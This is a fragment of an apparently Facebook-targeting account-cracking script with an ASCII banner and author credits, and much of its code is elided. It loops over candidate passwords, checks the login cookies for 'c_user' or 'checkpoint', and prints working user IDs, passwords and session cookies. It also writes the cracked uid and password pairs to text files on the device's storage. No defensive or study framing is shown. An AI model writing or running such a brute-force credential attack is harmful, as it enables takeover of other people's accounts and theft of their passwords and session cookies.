...
╰━━━┻━━╯╱╱╰━━━┻━━━╯     
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD SHUVO
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m RIFAT HOSSAIN 
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD ARIYAN
        ...
        for ps in pwx:
           ...
           'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[ZBI-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/ZBI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[ZBI-LK💔]= {uid}|{ps}")
                open('/sdcard/ZBI-LK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
